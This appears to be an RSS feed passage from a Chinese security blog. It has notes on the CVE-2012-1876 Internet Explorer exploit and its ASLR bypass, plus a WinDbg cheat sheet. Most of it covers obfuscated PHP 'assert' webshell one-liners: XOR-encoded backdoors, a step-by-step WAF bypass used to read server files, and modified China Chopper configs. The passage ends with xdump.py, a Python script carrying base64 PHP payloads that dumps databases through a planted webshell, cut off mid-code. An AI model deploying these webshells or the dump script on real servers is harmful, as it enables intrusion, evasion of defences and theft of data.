&quot;2699988&quot;没有找到,不知为何会出现这种情况,尝试用脚本将系统补丁全部删除,再重新尝试,在实验的win7x64位系统上仍然失
败,或许是书中配套资料中的rb文件也不是可以利用的,无奈放下这个问题,这里只学习书中提到的相关技术与这个漏洞的分析.

技术点

[+] cmd中用gflags.exe对ie进程开启hpa选项后,用ie打开poc.html,ie崩溃但是却没有被windbg拦截到异常,原因是ie衍生出子
进程,而windbg默认情况下是不支持子进程调试的,下面命令可开启子进程调试:
.childdbg 1

[+] 书中某一调试步骤中ln 69a69868命令得到的结果为:
(69a69868) mshtml!CTableLayout::`vftable` | (69a699a8) mshtml!CTableLayoutBlock::`vftable`
其中的关键字vftable是指&quot;虚表&quot;,虚表与类与虚表指针与对象的关系可参考下面链接:
http://blog.csdn.net/w616589292/article/details/51250285
http://blog.csdn.net/coolshine1234/article/details/17390143
http://blog.csdn.net/luxiaoyu_sdc/article/details/6145403
a)虚表对应类,虚表指针对应对象
b)对象的头4个字节存放的是虚表指针,虚表中每4个字节存放一个虚函数地址,各个虚函数地址构成一张&quot;表&quot;(这里指32位系统下
为4字节,64位系统应该是8字节)
如果[addr]=69a69868,由于69a69868处是虚表,也即69a69868是虚表指针的值,说明addr是对象所在的内存地址,书中参数1指的
是这里的addr,也即书中的[ebp+8]==poi(ebp+8)=065b9ea8

[+] 通过覆盖BSTR头部长度值得到模块基址.可参考如下链接:
http://www.cnblogs.com/Danny-Wei/p/3766337.html
BSTR是一种字符串数据类型,一种Pascal-Style字符串(明确标示字符串长度)和C-Style字符串(以\0结尾)的混合物,主要用于
COM,交互功能等,是一种复合的数据类型,由一个长度前缀,数据字符串和一个终止符组成,如下图所示:

header|               |terminator
4bytes|string(unicode)|00 00

通过修改header的内容修改BSTR的长度,使得BSTR可以访问可以访问原始界限以外的内存,由此可获得相关模块的基址以构造rop
链绕过aslr,具体如下:
-------------------------------
|BSTR|BSTR|BSTR|BSTR|BSTR|BSTR|
-------------------------------
|BSTR|BSTR|BSTR|BSTR|BSTR|BSTR|
-------------------------------
|BSTR|BSTR|BSTR|BSTR|BSTR|BSTR|
-------------------------------

首先在内存中连续创建一定数量且大小相同的BSTR,它们在内存中布局如上所示,然后释放一个BSTR并申请一个相同大小的
object(对象),申请的object很可能会被分配到刚刚释放的BSTR所在内存空间上,变成下面:
-------------------------------
|BSTR|BSTR|BSTR|BSTR|BSTR|BSTR|
-------------------------------
|BSTR|BSTR|object|BSTR|BSTR|BSTR|
-------------------------------
|BSTR|BSTR|BSTR|BSTR|BSTR|BSTR|
-------------------------------
此时可修改object前面一个BSTR的header内容,使该BSTR可以访问到object的虚表指针(在object的开关4字节),最终可计算出相
关模块的内存基址.有时候不能修改4字节的BSTR的header内容而只能修改1-2字节时,可以通过修改BSTR的终止符,从而将string
与后面的object连接起来,随后访问修改后的BSTR,也可以访问到object并计算相关模块基址

[+] 上面一个技术点中的通过得到object对象的虚表指针计算模块基址的方法为:
eg.mshtml.dll!CButtonLayout::`vftable`表示mshtml模块中的CButtonLayout类的虚函数表
如果某内存地址为addr处存放的是mshtml模块的CButtonLayout类的虚函数表,则addr是CButtonLayout对象的虚表指针的值,而
aslr的功能是让mshtml模块在内存中加载的基址不同,但addr在mshtml模块中的偏移是固定的,这个偏移量可在动态调试时容易
得到,假设addr在mshtml模块中的偏移量为x,那么由addr计算出mshtml模块为:mshtmlBase_=addr-x
也即对应书中对应的:
mshtmlbase=leak_addr-Number(0x001582b8)

这个技术点是典型的通过内存信息泄露(CButtonLayout对象的虚表指针泄露)获取有关内存布局,目标进程相关的状态信息的方
法,也可以通过静态变量的指针值等获取dll基址

[+] 绕过dep+aslr的一种思路
通过2次溢出,第一次溢出得到模块基址,第二次溢出控制代码执行eip

[+] 书中的构造堆布局以便将mshtml.dll基址泄露的js代码为:

&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
</description>
        <pubDate>Mon, 05 Dec 2016 00:00:00 +0800</pubDate>
        <link>http://localhost:4000/%E4%BA%8C%E8%BF%9B%E5%88%B6/2016/12/05/%E6%BC%8F%E6%B4%9E%E6%88%98%E4%BA%89-cve-2012-1876/</link>
        <guid isPermaLink="true">http://localhost:4000/%E4%BA%8C%E8%BF%9B%E5%88%B6/2016/12/05/%E6%BC%8F%E6%B4%9E%E6%88%98%E4%BA%89-cve-2012-1876/</guid>
        
        <category>bin</category>
        
        <category>js</category>
        
        <category>ie</category>
        
        
        <category>二进制</category>
        
      </item>
    
      <item>
        <title>windbg命令</title>
        <description>&lt;h3 id=&quot;0x01-windbg知识&quot;&gt;0x01 windbg知识&lt;/h3&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;http://www.yiiyee.cn/Blog/windbg/
http://www.cppblog.com/weiym/archive/2012/06/07/177958.aspx

1&amp;gt;db esi:查看esi地址中的内容
	db 400000:查看0x400000处的内容,db按字节大小查看,dd按DWORD类型查看
	dd poi(addr)
		poi(addr)相当于[addr],也即addr中存放的值,dd poi(addr)也即相当于dd addr1,其中addr1=[addr]

2&amp;gt;!address edi:显示edi地址处的内存状态,信息

3&amp;gt;lmm mso v:匹配mso模块,并显示详细信息
  ln addr:查找附近的符号
  x something:查找模块在内存中的地址
  	eg.x *!:查看所有模块在内存中的地址范围
	eg.x sufilter!:查看sufilter所有的代码符号(全局变量,函数)的加载地址
	eg.x sufilter!sufilterreadwritemt:查看模块中的函数的地址

4&amp;gt;bp eax:在eax处下断点,支持第几次经过后中断,支持中断后执行命令
  bp addr 在addr处设置断点
  bl 查看所有有已经设置的断点
  bc 清除所有断点
	  bc * 清除所有断点
  bu 对某个符号下断点,eg. bu MyApp!SomeFunction
	  在代码被修改之后,该断点会随着函数地址改变而自动更新到最新位置,而且bu断点会保存在WinDbg工作空间中,下
	  次启动WinDbg时该断点会自动设置
  bd 禁用断点
  be 启用被bd命令禁用的断点
  ba e|r|w(执行|读|写) 1|2|4|8(单位字节) addr
	  eg.对内存0x11111111进行写操作的时候下断点命令为:ba w4 0x11111111

5&amp;gt;g:让被调试的程序继续运行(f5)
  gh:把异常标识为已处理并断续执行程序
  go:对异常不进行任何处理并继续执行程序

6&amp;gt;kb:显示传递给堆栈回溯中的每个函数的前三个参数
  kp:显示传递给堆栈回溯中的每个函数的所有参数

7&amp;gt;u .:反汇编当前eip处的8条指令
  uf .:反汇编当前eip处的整个函数
  ub .:反汇编当前eip之前的8条指令
  u eip eip+a:反汇编eip到eip+10(a是16进制对应10进制的10)之间的指令
		eg.u eip-30 eip+30
  ub mso!Ordinal1273+0x2581:反汇编mso!Ordinal1273+0x2581地址之前的代码
	  uf test!main:反汇编test!main函数

8&amp;gt;p:单步步入step over
  t:单步步过trace into
  gu:执行到上一层函数,也即把当前函数帧执行到retn,并执行这个retn

9&amp;gt;? ebp-edi:显示表达式ebp-edi的值
	?? expression:显示c++表达式的值
10&amp;gt;.cls:清屏

11&amp;gt;获取进程环境块_PEB:
	a&amp;gt;.process 获得_PEB地址设为addr
	  dt _PEB 0xaddr可得到_PEB结构的数据
	b&amp;gt;也可通过dt _PEB @$peb直接获取_PEB结构的数据

12&amp;gt;查看堆的信息:
	!heap -h 查看所有堆的地址
	dt _HEAP 0xaddr 查看一个堆的信息
	dt _LIST_ENTRY 0xaddr 查看addr地址中存放的堆块索引信息,得到的结果为Flink和Blink的值

	!heap -h 查看所有的堆的情况,也可通过!heap直接查看
	!heap -a addr addr要求是一个堆的起始地址,该命令显示这个堆的信息
	!heap -p -a addr 查看一个地址在哪个堆块中,并显示这个堆块的信息

13&amp;gt;sxe ld:ModuleName 在首次加载ModuleName对应的模块时中断
	sx{e|d|i|n} [-c &quot;Cmd1&quot;] [-c2 &quot;Cmd2&quot;] [-h] {Exception|Event|*} 
		http://blog.csdn.net/hgy413/article/details/7598236

14&amp;gt;其中windbg中的kb命令相当于od中的查看调用堆栈(alt+k),如下图中的ChildEBP列为当前eip对应的ebp的值,RetAddr为当
   前eip所在的函数的函数返回地址,Args to Child为当前函数的参数,最后一列的地址是当前排的上一排中的RetAddr的值

   要注意的是,并不是kb下面的所有的ChildEBP对应的一列都是函数调用,只有第一排的ChildEBP,RetAddr,Args to
   Child的数据值是当前的函数调用的相关参数,从第二排开始的只是栈中高地址的数据内容从ebp到retn到参数相当于地址从

   一般情况下,栈空间中的低地址向高地址的排列,函数调用时,栈中的数据如下:

				...
				...    (new ebp为当前函数帧中的新的ebp,此处的new ebp代表当前函数帧的ebp的位置所在)
	new ebp --&amp;gt; old ebp(old ebp为上一函数帧的ebp,此处的old ebp代表new ebp位置中的内容值)
				retn   (retn为当前函数的返回地址)
				arg1   (arg1为当前函数的第一个参数)
				arg2   (arg2为当前函数的第二个参数)
				...

   也即当前ebp中存放的是上一函数帧的ebp,且当前ebp的下一栈单元的内容为当前函数的retn地址
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h3 id=&quot;0x02-windbg技巧&quot;&gt;0x02 windbg技巧&lt;/h3&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;1&amp;gt;用windbg附加要调试的程序时,在调试之前用gflag.exe开启了+hpa,但是在调试时,程序崩溃了而windbg没有断下来,这种情况
主要原因是被调试的程序衍生出子进程,而windbg默认情况下是不支持子进程调试的,可以使用如下命令开启子进程调试:
	.childdbg 1


&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
</description>
        <pubDate>Fri, 02 Dec 2016 00:00:00 +0800</pubDate>
        <link>http://localhost:4000/%E4%BA%8C%E8%BF%9B%E5%88%B6/2016/12/02/windbg%E5%91%BD%E4%BB%A4/</link>
        <guid isPermaLink="true">http://localhost:4000/%E4%BA%8C%E8%BF%9B%E5%88%B6/2016/12/02/windbg%E5%91%BD%E4%BB%A4/</guid>
        
        <category>windbg</category>
        
        <category>bin</category>
        
        
        <category>二进制</category>
        
      </item>
    
      <item>
        <title>xss好用姿势</title>
        <description>&lt;p&gt;xss库&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;1.http://www.backlion.org/?p=6218
2.https://www.leavesongs.com/PENETRATION/xss-collect.html
3.文件上传XSS:http://www.55118885.com/w/529184.html

&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

</description>
        <pubDate>Tue, 29 Nov 2016 00:00:00 +0800</pubDate>
        <link>http://localhost:4000/web/2016/11/29/xss%E5%A5%BD%E7%94%A8%E5%A7%BF%E5%8A%BF/</link>
        <guid isPermaLink="true">http://localhost:4000/web/2016/11/29/xss%E5%A5%BD%E7%94%A8%E5%A7%BF%E5%8A%BF/</guid>
        
        <category>xss</category>
        
        <category>web</category>
        
        
        <category>web</category>
        
      </item>
    
      <item>
        <title>assert免杀一句话</title>
        <description>&lt;h3 id=&quot;0x00-eval和assert的区别&quot;&gt;0x00 eval和assert的区别&lt;/h3&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;http://www.vuln.cn/8395
http://www.php.net/manual/zh/function.eval.php
http://php.net/manual/zh/functions.variable-functions.php

1)assert是函数,eval不是函数,是语言构造器
2)eval($a)中$a只能是字符串,assert($a)中$a可以是php代码,也可以是php代码的字符串,assert($a)的$a如果是字符串形式不
能有2个以上的分号,如果有2个以上的分号只执行到第一个,使用assert来执行多条php语句可借助eval来实现.

eg.assert(eval(&quot;echo 1;echo 2;&quot;));
[注意上面这句如果是assert(eval(&quot;echo 1;echo 2&quot;));这样写是不会执行echo 1也不会执行echo 2的,因为eval使用的字符串
要是有分号的php语句

eg.assert(eval(base64_decode($_POST[cmd])));
菜刀的连接方式为:
assert(eval(base64_decode($_POST[z0])));
新版菜刀无法连接assert类型的一句话,因为新版菜刀将连接方式改成了:
chopperPassValue=$xx=chr(98).chr(97).chr(115).chr(101).chr(54).chr(52).chr(95).chr(100).chr(101).chr(99).chr(111).chr(100).chr(101);$yy=$_POST;@eval($xx($yy[z0]));
相当于:
$xx=&quot;base64_decode&quot;
@eval($xx($_POST[z0]))
也即新版菜刀这里有两个以上的分号导致无法连接assert类型的一句话
link:http://joychou.org/index.php/web/caidao-20141213-does-not-support-php-assert-oneword-backdoor-analysis.html
2011年前的菜刀支持assert类型的webshell,2014年以后的菜刀不支持assert类型的webshell


3)实例
a)assert(phpinfo());
或
b)assert(&quot;phpinfo()&quot;);
或
c)assert(&quot;phpinfo();&quot;);

上面3个都是可以的,因为php函数中的参数如果是字符串可以不加双引号,但是:

a)assert(phpinfo();)不可执行,因为assert后面要接一个表达式,phpinfo();不是表达式,是一条php语句,但是换成
assert(&quot;phpinfo();&quot;)就可以执行了,这样&quot;phpinfo();&quot;当作是一个表达式,但是&quot;phpinfo();print_r(666);&quot;[assert的参数为字符串时字符串的引号中有多个分号时]不被当作表达式
b)assert(&quot;echo 1&quot;)是不可执行的,因为assert不能执行echo,eval(&quot;echo 1&quot;)是可以的,assert类型的webshell不能用echo来检
测,可以用print_r(1),也即assert(&quot;print_r(1)&quot;)或assert(&quot;print_r(1);&quot;)都是可以的
c)assert(&quot;print_r(1);print_r(2);&quot;)或assert(&quot;print_r(1);print_r(2)&quot;)都只能执行print_r(1),assert只会执行到第一个
分号内的语句

&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h3 id=&quot;0x01-一个waf的绕过过程&quot;&gt;0x01 一个waf的绕过过程&lt;/h3&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;1.waf过滤大部分关键字,eg.base64_decode,``,system等

2.尝试用如下方法绕过[uri=mytag_js.php?aid=9527],是个assert类型的webshell,通过echo不能执行,print_r可以执行判断出
不是eval类型webshell

3.考虑有可能是新版菜刀不支持assert类型的webshell连接,换成老版本菜刀依然失败,换成下面过waf的菜刀依然失败
http://joychou.org/index.php/web/make-own-chopper-which-can-bypass-dog.html

4.hackbar中post:[下面假设密码是x]
x=eval(&quot;echo 1;$one=(chr(19)^chr(114)).(chr(19)^chr(96)).(chr(19)^chr(96)).(chr(19)^chr(118)).(chr(19)^chr(97)).(chr(19)^chr(103));$three=(chr(19)^chr(113)).(chr(19)^chr(114)).(chr(19)^chr(96)).(chr(19)^chr(118)).(64).(chr(19)^chr(76)).(chr(19)^chr(119)).(chr(19)^chr(118)).(chr(19)^chr(112)).(chr(19)^chr(124)).(chr(19)^chr(119)).(chr(19)^chr(118));echo $_POST[nihao];&quot;)&amp;amp;nihao=cGhwaW5mbygp

其中$one=&quot;assert&quot;,$three=&quot;base64_decode&quot;,$nihao=&quot;phpinfo()&quot;以base64编码后的结果,结果无法成功执行phpinfo(),将
chr去掉变成:
x=eval(&quot;echo 1;echo $_POST[nihao];&quot;)&amp;amp;nihao=cGhwaW5mbygp,可以执行简单的echo,现在要想办法把$one和$three换成其他形
式,其他不是chr组合的形式

5.尝试post换成如下数据[没有chr]:
x=eval(&quot;echo 1;$one='assert';$three='b'.'as'.'e'.(64).'_decode';@$one(@$three($_POST[nihao]));&quot;)
依然失败

6.尝试不用base64_decode,用rot13
x=eval(' assert(str_rot13(&quot;cucvasb()&quot;))   ;')
可执行phpinfo()语句,尝试执行system(&quot;whoami&quot;),如下:
x=eval(' assert(str_rot13(&quot;flfgrz(\&quot;jubnzv\&quot;)&quot;))   ;')
执行失败,有可能是php禁用了命令执行函数或服务器开启了安全模式

7.考虑直接执行读文件php代码
x=eval('$filename =&quot;../index.php&quot;;
    $handle = fopen($filename, &quot;r&quot;);
	    $contents = fread($handle, filesize ($filename));
		    print_r($contents);
			    fclose($handle);')

结果可以执行成功,只是控制起来不方便,每次要自己写php代码,尝试改chopper,将里面的关键处的base64_decode换掉

8.最新版本的菜刀可配置度较高,但仍然采用base64加密传输,在菜刀目录下有个caidao.conf
利用下面两个特性更改&amp;lt;PHP_BASE&amp;gt;标签中的连接方法可过狗:
a)assert类型的webshell正常情况下只能执行一句话[一个分号内的内容],想让assert类型的webshell执行多句php代码,可借
助eval执行多条命令
b)把base64_decode想办法混淆
eg.将caidao.conf中的PHP_BASE改成如下内容:
eval('$a=chr(98).chr(97).chr(115).chr(101).chr(54).chr(52).chr(95).chr(100).chr(101).chr(99).chr(111).chr(100).chr(101);@eval($a(&quot;%s&quot;));');
成功过狗

9.在waf阻拦下无法连接一句话chopper时,每种waf的阻拦规则不一样,可在新版chopper目录下放多个不同的可过waf的配置文件
备用,一个caidao.conf不过狗时再用其他caidao.conf,有效配置为&quot;caidao.conf&quot;文件
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h3 id=&quot;0x02-免杀无特征无关键字一句话&quot;&gt;0x02 免杀无特征无关键字一句话&lt;/h3&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;1.用chr(%d)^chr(%d)代替上面的chr

for($i=1;$i&amp;lt;=200;$i++)
{echo 'chr(19)^chr('.$i.') is:';
echo chr(19)^chr($i);
echo '&amp;lt;br&amp;gt;';}

2.上面的php代码可得到以chr(19)为基础的关键字的组合形式如下:

chr(19)^chr(114) is:a
chr(19)^chr(96):s
chr(19)^chr(96):s
chr(19)^chr(118) is:e
chr(19)^chr(97) is:r
chr(19)^chr(103) is:t

chr(19)^chr(113):b
chr(19)^chr(114):a
chr(19)^chr(96):s
chr(19)^chr(118) is:e
chr(19)^chr(37) is:6
chr(19)^chr(39) is:4
chr(19)^chr(76) is:_
chr(19)^chr(119) is:d
chr(19)^chr(118) is:e
chr(19)^chr(112) is:c
chr(19)^chr(124) is:o
chr(19)^chr(119) is:d
chr(19)^chr(118) is:e

3.组合

$a=(chr(19)^chr(114)).(chr(19)^chr(96)).(chr(19)^chr(96)).(chr(19)^chr(118)).(chr(19)^chr(97)).(chr(19)^chr(103)) ;
$b=(chr(19)^chr(113)).(chr(19)^chr(114)).(chr(19)^chr(96)).(chr(19)^chr(118)).(64).(chr(19)^chr(76)).(chr(19)^chr(119)).(chr(19)^chr(118)).(chr(19)^chr(112)).(chr(19)^chr(124)).(chr(19)^chr(119)).(chr(19)^chr(118));
$a($b($_POST[cmd]));

4.用法

eg.
在hackbar中post:
cmd=ZXZhbCgnZWNobyAxO3BocGluZm8oKTsnKQ==
其中ZXZhbCgnZWNobyAxO3BocGluZm8oKTsnKQ==是eval('echo 1;phpinfo();')的base64编码的结果
如果要执行更复杂的功能可通过以下步骤:
a)在菜刀中新加webshell的url和对应密码
b)_charles开sock5代理,eg.127.0.0.1:8889
c)用proxfier设置菜刀[任意版本菜刀都可]的代理为b)中提供的127.0.0.1:8889
d)把想做的动作在菜刀中做出来,在charles中查看对应的base64编码过的代码是什么
e)将d中得到的base64编码过的代码用hackbar或其他工具base64decode,将解码后的php代码替换上面
  eval('echo 1;phpinfo();')中的echo 1;phpinfo();后再将eval('这里是解码后的代码')这个整体用hackbar或其他工具
  base64编码下
f)最后将cmd=xxxxxxxxxxxx 在hackbar中post出去,其中xxxxxxxxx是e中编码后的结果

5.特点

a)传输的数据是base64加密过的没有任何关键字的数据
b)服务端一句话没有任何关键字
c)利用方式不是很方便
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h3 id=&quot;0x03-相关链接&quot;&gt;0x03 相关链接&lt;/h3&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;1.mytag_js.php样本文件及分析
样本文件:https://github.com/3xp10it/webshell/tree/master/mytag_js
相关分析:http://www.nxadmin.com/penetration/1168.html
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;Attention:首发于360播报,版权归360播报所有&lt;/p&gt;
</description>
        <pubDate>Fri, 25 Nov 2016 00:00:00 +0800</pubDate>
        <link>http://localhost:4000/web/2016/11/25/assert%E5%85%8D%E6%9D%80%E4%B8%80%E5%8F%A5%E8%AF%9D/</link>
        <guid isPermaLink="true">http://localhost:4000/web/2016/11/25/assert%E5%85%8D%E6%9D%80%E4%B8%80%E5%8F%A5%E8%AF%9D/</guid>
        
        <category>webshell</category>
        
        <category>assert</category>
        
        <category>eval</category>
        
        
        <category>web</category>
        
      </item>
    
      <item>
        <title>一句话webshell客户端脱库</title>
        <description>&lt;h1 id=&quot;xdumppy&quot;&gt;xdump.py&lt;/h1&gt;

&lt;h3 id=&quot;disclaimer&quot;&gt;Disclaimer&lt;/h3&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;[!] legal disclaimer: Usage of xdump.py for attacking targets without prior mutual consent is illegal.
It is the end user's responsibility to obey all applicable local, state and federal laws. 
Developers assume no liability and are not responsible for any misuse or damage caused by this program
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h3 id=&quot;usage&quot;&gt;Usage&lt;/h3&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;python3 xdump.py
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h3 id=&quot;about&quot;&gt;About&lt;/h3&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;xdump.py是一个python3下的脱库脚本,只要提供一句话webshell和相关密码就可脱库,与一般大马脱库的区别在于这里的脱库可
订制,可灵活变换代码以绕过waf,相当于用chopper的思路来脱库,不过脱库方法可订制,且比一般大马的脱库更好用,理论上
xdump.py可脱任意大小的数据库,不用担心会超时,因为xdump采用的是每次只脱部分少量数据[eg.每次脱200条数据],也可在代
码中设置每次延时一定时间再继续脱少量数据.

&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h3 id=&quot;detail&quot;&gt;Detail&lt;/h3&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;支持两种脱库用法

1.不抓包模式
不抓包模式目前仅测试过mysql+php的脱库,其他类型应该暂不支持,因为不抓包模式用的是固定的php连接数据库的代码

2.抓包模式
抓包模式支持菜刀支持的所有数据库和脚本组合类型的脱库,需要抓包才能用.抓包方法如下:

a.chopper连上webshell
b.charles设置好本地sock5代理.[eg.127.0.0.1:8889]
c.proxfier设置chopper的代理为charles提供的127.0.0.1:8889
d.在chopper中配置好数据库连接参数并连接数据库
e.在chopper连上数据库后随便双击某个数据库的某个表
f.将e步骤在charles中抓取的包整理下存放在本地,整理的格式在代码中有示例,需要提供header和post两份数据,示例文件如下
link:https://github.com/3xp10it/xdump
g.运行python3 xdump.py

&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h3 id=&quot;code&quot;&gt;Code&lt;/h3&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;'''
#header文件格式要求
eg.

Cache-Control:no-cache
Referer:http://www.abc.com
Content-Type:application/x-www-form-urlencoded
User-Agent:Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)
Connection:keey-alive
Accept:*/*

#post数据文件格式要求,eg.


chopperPassValue=$xx=chr(98).chr(97).chr(115).chr(101).chr(54).chr(52).chr(95).chr(100).chr(101).chr(99).chr(111).chr(100).chr(101);$yy=$_POST;@eval($xx($yy[z0]));
z0=QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwiMCIpO0BzZXRfdGltZV9saW1pdCgwKTtAc2V0X21hZ2ljX3F1b3Rlc19ydW50aW1lKDApO2VjaG8oIi0+fCIpOzskbT1nZXRfbWFnaWNfcXVvdGVzX2dwYygpOyRoc3Q9JG0/c3RyaXBzbGFzaGVzKCRfUE9TVFsiejEiXSk6JF9QT1NUWyJ6MSJdOyR1c3I9JG0/c3RyaXBzbGFzaGVzKCRfUE9TVFsiejIiXSk6JF9QT1NUWyJ6MiJdOyRwd2Q9JG0/c3RyaXBzbGFzaGVzKCRfUE9TVFsiejMiXSk6JF9QT1NUWyJ6MyJdOyRkYm49JG0/c3RyaXBzbGFzaGVzKCRfUE9TVFsiejQiXSk6JF9QT1NUWyJ6NCJdOyRzcWw9YmFzZTY0X2RlY29kZSgkX1BPU1RbIno1Il0pOyRUPUBteXNxbF9jb25uZWN0KCRoc3QsJHVzciwkcHdkKTtAbXlzcWxfcXVlcnkoIlNFVCBOQU1FUyB1dGY4Iik7QG15c3FsX3NlbGVjdF9kYigkZGJuKTskcT1AbXlzcWxfcXVlcnkoJHNxbCk7JGk9MDt3aGlsZSgkY29sPUBteXNxbF9maWVsZF9uYW1lKCRxLCRpKSl7ZWNobygkY29sLiJcdHxcdCIpOyRpKys7fWVjaG8oIlxyXG4iKTt3aGlsZSgkcnM9QG15c3FsX2ZldGNoX3JvdygkcSkpe2ZvcigkYz0wOyRjPCRpOyRjKyspe2VjaG8odHJpbSgkcnNbJGNdKSk7ZWNobygiXHR8XHQiKTt9ZWNobygiXHJcbiIpO31AbXlzcWxfY2xvc2UoJFQpOztlY2hvKCJ8PC0iKTtkaWUoKTs=
z1=this is db host
z2=this is db user
z3=this is db pass
z4=this is db name
z5=this is query param(提供的post文件里这行可以没有)
'''

import re
import base64
import sys
import os
from exp10it import get_http_domain_from_url
from exp10it import get_random_header
from exp10it import post_requests
from exp10it import get_input_intime

#global count, everyQueryCount,countOfTableDict
#Attention!!!如果一次没有dump完意外中断了,下一次继续dump的时候要改变代码中的下面的count数,并要保证
#start=everyQueryCount*count+1为继续dump的起始点的值[eg.每次查询为200,则要保证200*count+1=新起点dump处],运行之前只需要改count

count =0
start=0
everyQueryCount = 0
countOfTableDict={}
maxUid=0
primaryColumnName=&quot;0&quot;


def getPrimaryColumnName():
    #尝试获取可以dump的主键[eg.uid,如果是非数字的主键就不能根据主键来dump数据了]
    result=query(&quot;select * from %s limit 1&quot; % tableName)
    print(&quot;The table you select has below columns:\n&quot;)
    pureData = result.split(&quot;\r\n&quot;)[0]
    list = re.findall(&quot;([^\s\|]+)&quot;, pureData)
    for eachColumn in list:
        print(eachColumn)
    primaryColumnName=input(&quot;Please input your primaryColumnName [eg.uid,this way use `where` keyword],\n\
if there is no primaryColumnName like uid,input 0 for very slow way[this way use `order by + limit` \
keyword]:\n&quot;)
    return primaryColumnName


def HandlePostData():
    global postData, everyQueryCount, count,start,maxUid,primaryColumnName
    start = everyQueryCount * count + 1
    #下面这里要注意,直接用order by + limit查询的时候会很慢,最好先看要dump的表的主键是什么,然后根据主键用where来
    #dump,这样会比limit快很多,具体情况要根据表的主键来改变下面的query语句,根据主键来查询的时候,终止查询的地方要
    #由主键的最后一个数值来决定,不能由count(*)得到的结果来决定,因为count(*)得到的结果和通过主键[eg.uid]来得到的
    #个数可能不同,也即要由select max(uid) from table得到的数值来决定
    if primaryColumnName==&quot;0&quot;:
        queryString = &quot;SELECT * FROM `%s` ORDER BY 1 DESC LIMIT %d,%d&quot; % (tableName, start, start + everyQueryCount - 1)
        if start&amp;gt;countOfTableDict[tableName]:
            sys.exit(1)
    else:
        #下面的语句中没有order by,如果加了order by uid limit 100000,101000也会很慢
        queryString = &quot;SELECT * FROM `%s` where %s&amp;gt;=%d and %s&amp;lt;=%d&quot; % (tableName,primaryColumnName,start,primaryColumnName, start + everyQueryCount - 1)

        if maxUid==0:
            #尝试得到最大的uid值
            tmpQueryString=&quot;select max(%s) from %s&quot; % (primaryColumnName,tableName)
            print(tmpQueryString)
            result=query(tmpQueryString)
            tmp= re.search(&quot;(\d+)&quot;, result).group(1)
            maxUid=int(tmp)
            choose=input(&quot;Do you agree my got maxUid value:%d? [y|n] default[y]:&quot; % maxUid)
            if choose==&quot;n&quot; or choose=='N':
                maxUid=int(input(&quot;Please input your correct maxUid value:&quot;))
            else:
                pass
        else:
            #初次获取maxUid后以后不再获取maxUid
            pass
        if start&amp;gt;maxUid:
            print(&quot;已经查完了这个表&quot;)
            sys.exit(1)
    print(queryString)
    postData[&quot;z5&quot;] = base64.b64encode(queryString.encode(encoding=&quot;utf-8&quot;))


def query(queryString):
    global mode
    global httpHeaderContent
    global dbHost, dbUser, dbPass, dbName, postData, url, chopperPass
    if mode == 1:
        postData['z0'] = &quot;QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwiMCIpO0BzZXRfdGltZV9saW1pdCgwKTtAc2V0X21hZ2ljX3F1b3Rlc19ydW50aW1lKDApO2VjaG8oIi0+fCIpOzskbT1nZXRfbWFnaWNfcXVvdGVzX2dwYygpOyRoc3Q9JG0/c3RyaXBzbGFzaGVzKCRfUE9TVFsiejEiXSk6JF9QT1NUWyJ6MSJdOyR1c3I9JG0/c3RyaXBzbGFzaGVzKCRfUE9TVFsiejIiXSk6JF9QT1NUWyJ6MiJdOyRwd2Q9JG0/c3RyaXBzbGFzaGVzKCRfUE9TVFsiejMiXSk6JF9QT1NUWyJ6MyJdOyRkYm49JG0/c3RyaXBzbGFzaGVzKCRfUE9TVFsiejQiXSk6JF9QT1NUWyJ6NCJdOyRzcWw9YmFzZTY0X2RlY29kZSgkX1BPU1RbIno1Il0pOyRUPUBteXNxbF9jb25uZWN0KCRoc3QsJHVzciwkcHdkKTtAbXlzcWxfcXVlcnkoIlNFVCBOQU1FUyB1dGY4Iik7QG15c3FsX3NlbGVjdF9kYigkZGJuKTskcT1AbXlzcWxfcXVlcnkoJHNxbCk7JGk9MDt3aGlsZSgkY29sPUBteXNxbF9maWVsZF9uYW1lKCRxLCRpKSl7ZWNobygkY29sLiJcdHxcdCIpOyRpKys7fWVjaG8oIlxyXG4iKTt3aGlsZSgkcnM9QG15c3FsX2ZldGN